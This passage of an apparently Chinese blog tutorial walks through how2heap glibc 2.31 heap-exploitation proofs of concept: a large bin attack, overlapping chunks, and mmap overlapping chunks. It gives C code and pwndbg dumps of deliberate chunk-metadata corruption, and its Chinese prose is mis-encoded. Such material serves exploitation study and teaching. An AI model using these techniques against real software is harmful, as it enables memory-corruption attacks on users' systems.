victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 1 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 2 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This prevents the traditional large bin attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here is the target we want to overwrite (%p) : %lu\n\n&quot;</span>,&amp;target,target);</span><br><span class="line">  <span class="keyword">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;First, we allocate a large chunk [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;And another chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We also allocate a second large chunk [p2]  (%p).\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This chunk should be smaller than [p1] and belong to the same large bin.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="keyword">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd-&gt;nexsize is overwritten to address of [p2] (%p)\n&quot;</span>, p2<span class="number">-2</span>, p1<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;</span>, p2<span class="number">-2</span>, (<span class="keyword">void</span> *)target);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(<span class="keyword">size_t</span>*)target);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  assert((<span class="keyword">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-overlapping-chunks"><a href="#6-overlapping-chunks" class="headerlink" title="6. overlapping_chunks"></a>6. overlapping_chunks</h3><p>é€šè¿‡ä¿®æ”¹ size é€ æˆå †é‡å ï¼Œç„¶åæ‹¿åˆ°ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€ä¸ª chunk</p><p>æ„é€ å¦‚ä¸‹ chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line"><span class="number">0x555555559000</span>      <span class="number">0x0</span>                 <span class="number">0x290</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559290</span>      <span class="number">0x0</span>                 <span class="number">0x80</span>                 Used                None              None</span><br><span class="line"><span class="number">0x555555559310</span>      <span class="number">0x3131313131313131</span>  <span class="number">0x500</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559810</span>      <span class="number">0x3232323232323232</span>  <span class="number">0x80</span>                 Used                None              None</span><br></pre></td></tr></table></figure><p>p1 æ˜¯ å¤§å° 0x80 çš„chunkï¼Œ p2 æ˜¯å¤§å°ä¸º 0x500 çš„chunk ï¼Œp3 æ˜¯å¤§å°ä¸º 0x80 çš„chuk</p><p>ç„¶åä¿®æ”¹ p2 çš„å¤§å° ä¸º p2 +p 3</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">44</span> <span class="comment">/* VULNERABILITY */</span></span><br><span class="line">â–º <span class="number">45</span> *(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// we are overwriting the &quot;size&quot; field of chunk p2</span></span><br><span class="line">  <span class="number">46</span> <span class="comment">/* VULNERABILITY */</span></span><br></pre></td></tr></table></figure><p>å†ç„¶åé‡Šæ”¾ p2</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">48</span> <span class="built_in">printf</span>(<span class="string">&quot;\nNow let&#x27;s free the chunk p2\n&quot;</span>);</span><br><span class="line">â–º <span class="number">49</span> <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="number">50</span> <span class="built_in">printf</span>(<span class="string">&quot;The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>å†åˆ†é…ä¸€ä¸ªæ–°çš„ å¤§å°ç¬¦åˆä¿®æ”¹ä¹‹åçš„  chunkï¼Œ å¯ä»¥æŠŠ ä¿®æ”¹å®Œ chunk ä¹‹åçš„ p2+p3 é‡æ–°åˆ†é…å›æ¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">56</span> p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br><span class="line"> â–º <span class="number">58</span> <span class="built_in">printf</span>(<span class="string">&quot;\np4 has been allocated at %p and ends at %p\n&quot;</span>, (<span class="keyword">char</span> *)p4, (<span class="keyword">char</span> *)p4+evil_region_size);</span><br><span class="line">   <span class="number">59</span> <span class="built_in">printf</span>(<span class="string">&quot;p3 starts at %p and ends at %p\n&quot;</span>, (<span class="keyword">char</span> *)p3, (<span class="keyword">char</span> *)p3+<span class="number">0x580</span><span class="number">-8</span>);</span><br><span class="line">   <span class="number">60</span> <span class="built_in">printf</span>(<span class="string">&quot;p4 should overlap with p3, in this case p4 includes all p3.\n&quot;</span>);</span><br><span class="line">   <span class="number">61</span></span><br><span class="line">   <span class="number">62</span> <span class="built_in">printf</span>(<span class="string">&quot;\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,&quot;</span></span><br><span class="line">   <span class="number">63</span>    <span class="string">&quot; and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n&quot;</span>);</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">00:0000â”‚ rsp  0x7fffffffe280 â€”â–¸ 0x7fffffffe3b8 â€”â–¸ 0x7fffffffe633 â—‚â€” &#x27;/media/psf/Home/Downloads/how2heap/glibc_2.31/overlapping_chunks&#x27;</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚      <span class="number">0x7fffffffe288</span> â—‚â€” <span class="number">0x15555556d</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚      <span class="number">0x7fffffffe290</span> â€”â–¸ <span class="number">0x7ffff7fb5fc8</span> (__exit_funcs_lock) â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚      <span class="number">0x7fffffffe298</span> â—‚â€” <span class="number">0x57800000581</span></span><br><span class="line">04:0020â”‚      0x7fffffffe2a0 â€”â–¸ 0x5555555592a0 â—‚â€” 0x3131313131313131 (&#x27;11111111&#x27;)</span><br><span class="line">05:0028â”‚      0x7fffffffe2a8 â€”â–¸ 0x555555559320 â—‚â€” 0x3232323232323232 (&#x27;22222222&#x27;)</span><br><span class="line">06:0030â”‚      0x7fffffffe2b0 â€”â–¸ 0x555555559820 â—‚â€” 0x3333333333333333 (&#x27;33333333&#x27;)</span><br><span class="line">07:0038â”‚      0x7fffffffe2b8 â€”â–¸ 0x555555559320 â—‚â€” 0x3232323232323232 (&#x27;22222222&#x27;)</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º f <span class="number">0</span>     <span class="number">555555555390</span> main+<span class="number">359</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; p p4+evil_region_size</span><br><span class="line">$<span class="number">9</span> = (<span class="keyword">long</span> *) <span class="number">0x55555555bee0</span></span><br><span class="line">pwndbg&gt; p p3+<span class="number">0x580</span><span class="number">-8</span></span><br><span class="line">$<span class="number">10</span> = (<span class="keyword">long</span> *) <span class="number">0x55555555c3e0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°±ä¼šå‘ç° p4 å’Œ p3 é‡å äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope p3</span><br><span class="line">00:0000â”‚ rax rdi  0x555555559820 â—‚â€” 0x3333333333333333 (&#x27;33333333&#x27;)</span><br><span class="line">... â†“</span><br><span class="line">pwndbg&gt; telescope p4</span><br><span class="line">00:0000â”‚   0x555555559320 â—‚â€” 0x3434343434343434 (&#x27;44444444&#x27;)</span><br><span class="line">... â†“</span><br><span class="line">pwndbg&gt; hexdump <span class="number">0x555555559320</span> <span class="number">0x400</span></span><br><span class="line">+<span class="number">0000</span> <span class="number">0x555555559320</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  â”‚<span class="number">4444</span>â”‚<span class="number">4444</span>â”‚<span class="number">4444</span>â”‚<span class="number">4444</span>â”‚</span><br><span class="line">...</span><br><span class="line">pwndbg&gt;</span><br><span class="line">+<span class="number">0020</span> <span class="number">0x555555559720</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  â”‚<span class="number">4444</span>â”‚<span class="number">4444</span>â”‚<span class="number">4444</span>â”‚<span class="number">4444</span>â”‚</span><br><span class="line">...</span><br><span class="line">+<span class="number">0120</span> <span class="number">0x555555559820</span>  <span class="number">33</span> <span class="number">33</span> <span class="number">33</span> <span class="number">33</span>  <span class="number">33</span> <span class="number">33</span> <span class="number">33</span> <span class="number">33</span>  <span class="number">33</span> <span class="number">33</span> <span class="number">33</span> <span class="number">33</span>  <span class="number">33</span> <span class="number">33</span> <span class="number">33</span> <span class="number">33</span>  â”‚<span class="number">3333</span>â”‚<span class="number">3333</span>â”‚<span class="number">3333</span>â”‚<span class="number">3333</span>â”‚</span><br><span class="line">...</span><br><span class="line">+<span class="number">0170</span> <span class="number">0x555555559870</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  â”‚<span class="number">4444</span>â”‚<span class="number">4444</span>â”‚<span class="number">4444</span>â”‚<span class="number">4444</span>â”‚</span><br><span class="line">...</span><br><span class="line">+<span class="number">0190</span> <span class="number">0x555555559890</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">71</span> <span class="number">07</span> <span class="number">02</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  â”‚<span class="number">4444</span>â”‚<span class="number">4444</span>â”‚q...â”‚....â”‚</span><br><span class="line">+<span class="number">01</span>a0 <span class="number">0x5555555598a0</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  â”‚....â”‚....â”‚....â”‚....â”‚</span><br><span class="line">...</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><h3 id="7-mmap-overlapping-chunks"><a href="#7-mmap-overlapping-chunks" class="headerlink" title="7. mmap_overlapping_chunks"></a>7. mmap_overlapping_chunks</h3><pre><code>    GLibCä¸­çš„Mmap chunkså…¥é—¨çŸ¥è¯†    ==================================åœ¨GLibCä¸­ï¼Œæœ‰ä¸€ä¸ªç‚¹ï¼Œå½“ä¸€ä¸ªåˆ†é…æ˜¯å¦‚æ­¤ä¹‹å¤§ï¼Œä»¥è‡³äºmallocå†³å®šæˆ‘ä»¬éœ€è¦ä¸€ä¸ªå•ç‹¬çš„å†…å­˜éƒ¨åˆ†æ¥å¤„ç†å®ƒï¼Œè€Œä¸æ˜¯åœ¨æ­£å¸¸çš„å †ä¸Šåˆ†é…å®ƒã€‚è¿™æ˜¯ç”± mmap_threshold var.ä»£æ›¿æ­£å¸¸çš„è·å–å—çš„é€»è¾‘ï¼Œç³»ç»Ÿè°ƒç”¨ Mmapã€‚è¿™å°†åˆ†é…ä¸€æ®µè™šæ‹Ÿå†…å­˜ï¼Œå¹¶æŠŠå®ƒè¿˜ç»™ç”¨æˆ·ã€‚åŒæ ·ï¼Œé‡Šæ”¾è¿‡ç¨‹ä¹Ÿä¼šæœ‰æ‰€ä¸åŒã€‚é‡Šæ”¾çš„å—ä¸æ˜¯è¿˜ç»™ä¸€ä¸ªbinæˆ–å †çš„å…¶ä»–éƒ¨åˆ†ï¼Œè€Œæ˜¯ä½¿ç”¨å¦ä¸€ä¸ªsyscallã€‚*Munmap*. å®ƒæ¥æ”¶ä¸€ä¸ªå…ˆå‰åˆ†é…çš„Mmapå—çš„æŒ‡é’ˆï¼Œå¹¶å°†å…¶é‡Šæ”¾å›å†…æ ¸ã€‚Mmap chunksåœ¨å¤§å°å…ƒæ•°æ®ä¸Šæœ‰ä¸€ä¸ªç‰¹æ®Šçš„ä½ï¼šç¬¬äºŒä½ã€‚å¦‚æœè¿™ä¸ªä½è¢«è®¾ç½®ï¼Œé‚£ä¹ˆè¿™ä¸ªå—å°±è¢«åˆ†é…ä¸ºä¸€ä¸ªMmapå—ã€‚Mmapåˆ†å—æœ‰ä¸€ä¸ªprev_sizeå’Œä¸€ä¸ªsizeã€‚å¤§å°*ä»£è¡¨å½“å‰çš„ åˆ†å—çš„å¤§å°ã€‚ä¸€ä¸ªchunkçš„*prev_size*è¡¨ç¤ºå‰©ä½™çš„ç©ºé—´ã€‚çš„å¤§å°ï¼ˆä¸æ˜¯ç›´æ¥ä½äºå¤§å°çš„åˆ†å—ï¼‰ã€‚ç„¶è€Œï¼Œfdå’ŒbkæŒ‡é’ˆå¹¶æ²¡æœ‰è¢«ä½¿ç”¨ï¼Œå› ä¸ºMmap chunkså¹¶æ²¡æœ‰è¿”å›åˆ° çš„å¤§å°ï¼Œå°±åƒGLibC Mallocä¸­çš„å¤§å¤šæ•°å †å—ä¸€æ ·ã€‚é‡Šæ”¾åï¼Œ åˆ†å—å¿…é¡»æ˜¯é¡µé¢å¯¹é½çš„ã€‚ä¸‹é¢çš„POCæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªé‡å çš„chunkæ”»å‡»ï¼Œä½†åœ¨mmap chunksä¸Šã€‚è¿™å’Œhttps://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c éå¸¸ç›¸ä¼¼ã€‚ä¸»è¦çš„åŒºåˆ«æ˜¯ï¼Œmmapped chunksæœ‰ç‰¹æ®Šçš„å±æ€§ï¼Œå¹¶ä¸”æ˜¯ ä»¥ä¸åŒçš„æ–¹å¼å¤„ç†ï¼Œåˆ›é€ å‡ºä¸æ­£å¸¸æƒ…å†µä¸‹ä¸åŒçš„æ”»å‡»åœºæ™¯ã€‚é‡å çš„åˆ†å—æ”»å‡»ã€‚è¿˜å¯ä»¥åšå…¶ä»–çš„äº‹æƒ…ã€‚å¦‚munmappingç³»ç»Ÿåº“ã€å †æœ¬èº«å’Œå…¶ä»–ä¸œè¥¿ã€‚è¿™åªæ˜¯ä¸€ä¸ªç®€å•çš„æ¦‚å¿µè¯æ˜ï¼Œç›®çš„æ˜¯ä¸ºäº†è¯æ˜ä¸€èˆ¬çš„ çš„æ–¹æ³•æ¥æ‰§è¡Œå¯¹ mmap åˆ†å—çš„æ”»å‡»ã€‚ å…³äºGLibCä¸­mmap chunksçš„æ›´å¤šä¿¡æ¯ï¼Œè¯·é˜…è¯»è¿™ç¯‡æ–‡ç« ã€‚http://tukan.farm/2016/07/27/munmap-madness/</code></pre><p>é¦–å…ˆä½¿ç”¨ malloc åˆ†é…å‡ ä¸ªå¤§çš„ chunk :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">57</span> <span class="keyword">long</span> <span class="keyword">long</span>* top_ptr = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">  <span class="number">58</span> <span class="built_in">printf</span>(<span class="string">&quot;The first mmap chunk goes directly above LibC: %p\n&quot;</span>,top_ptr);</span><br><span class="line">  <span class="number">59</span></span><br><span class="line">  <span class="number">60</span> <span class="comment">// After this, all chunks are allocated downwards in memory towards the heap.</span></span><br><span class="line">â–º <span class="number">61</span> <span class="keyword">long</span> <span class="keyword">long</span>* mmap_chunk_2 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">  <span class="number">62</span> <span class="built_in">printf</span>(<span class="string">&quot;The second mmap chunk goes below LibC: %p\n&quot;</span>, mmap_chunk_2);</span><br><span class="line">  <span class="number">63</span></span><br><span class="line">  <span class="number">64</span> <span class="keyword">long</span> <span class="keyword">long</span>* mmap_chunk_3 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">  <span class="number">65</span> <span class="built_in">printf</span>(<span class="string">&quot;The third mmap chunk goes below the second mmap chunk: %p\n&quot;</span>, mmap_chunk_3);</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶æˆ‘ä»¬å¯ä»¥çŸ¥é“ mmap_chunk_3 çš„ preve size å’Œ size åˆ†åˆ«ä¸ºï¼š 0 å’Œ 0x101002</p><p>å‡è®¾æˆ‘ä»¬æ­¤æ—¶æœ‰ä¸€ä¸ªæ¼æ´å¯ä»¥ä¿®æ”¹ preve_size</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">88</span> <span class="comment">// Vulnerability!!! This could be triggered by an improper index or a buffer overflow from a chunk further below.</span></span><br><span class="line">  <span class="number">89</span> <span class="comment">// Additionally, this same attack can be used with the prev_size instead of the size.</span></span><br><span class="line">â–º <span class="number">90</span> mmap_chunk_3[<span class="number">-1</span>] = (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_3[<span class="number">-1</span>]) + (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_2[<span class="number">-1</span>]) | <span class="number">2</span>;</span><br><span class="line">  <span class="number">91</span> <span class="built_in">printf</span>(<span class="string">&quot;New size of third mmap chunk: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="number">-1</span>]);</span><br><span class="line">  <span class="number">92</span> <span class="built_in">printf</span>(<span class="string">&quot;Free the third mmap chunk, which munmaps the second and third chunks\n\n&quot;</span>);</span><br><span class="line">  <span class="number">93</span></span><br><span class="line">  <span class="number">94</span> <span class="comment">/*</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°† prev_size ä¿®æ”¹ä¸º 0x202002 , ç„¶åæˆ‘ä»¬ free mmap_chunk_3 , </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">102</span> Because of <span class="keyword">this</span> added restriction, the main goal is to get the memory back from the system</span><br><span class="line">  <span class="number">103</span> to have two pointers assigned to the same location.</span><br><span class="line">  <span class="number">104</span> */</span><br><span class="line">  <span class="number">105</span> <span class="comment">// Munmaps both the second and third pointers</span></span><br><span class="line">â–º <span class="number">106</span> <span class="built_in">free</span>(mmap_chunk_3);</span><br><span class="line">  <span class="number">107</span></span><br><span class="line">  <span class="number">108</span> <span class="comment">/*</span></span><br><span class="line"><span class="comment">  109 Would crash, if on the following:</span></span><br><span class="line"><span class="comment">  110 mmap_chunk_2[0] = 0xdeadbeef;</span></span><br><span class="line"><span class="comment">  111 This is because the memory would not be allocated to the current program.</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å† malloc ä¸€ä¸ªå¤§å° 0x300000 